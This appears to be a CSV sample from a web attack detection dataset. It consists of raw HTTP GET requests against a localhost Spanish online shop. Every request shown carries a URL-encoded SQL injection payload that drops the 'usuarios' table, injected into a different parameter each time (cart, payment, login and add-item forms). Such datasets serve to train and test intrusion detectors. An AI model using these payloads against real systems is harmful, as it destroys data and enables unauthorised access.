id,text
6861,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
1618,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
22592,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
15954,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
7924,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Confirmar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
7140,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8588&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
425,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7744&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
7637,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4344&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
3457,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1063&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
18634,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=7701&B1=Confirmar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
5539,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=5080&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
8788,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=7191&B1=Confirmar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
22923,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=3714&B1=Confirmar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
21438,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3650%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Confirmar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
21540,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8588&B1=Confirmar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
15410,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=3532&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
13415,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=6072&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
3093,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=6606&B1=Pasar+por+caja HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
24520,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&pwd=caLabrotar&remember=on&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
19004,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hedrich&pwd=chonta&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
22903,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=76&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
3364,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=schlacht&pwd=43s8a&remember=off&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
24425,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sydney&pwd=r%24aToNESCA&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
Pragma: no-cache\r\n
Cache-control: no-cache\r\n
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
Accept-Language: en\r\n
Host: localhost:8080\r\n
Connection: close\r\n
\r\n
\r\n"
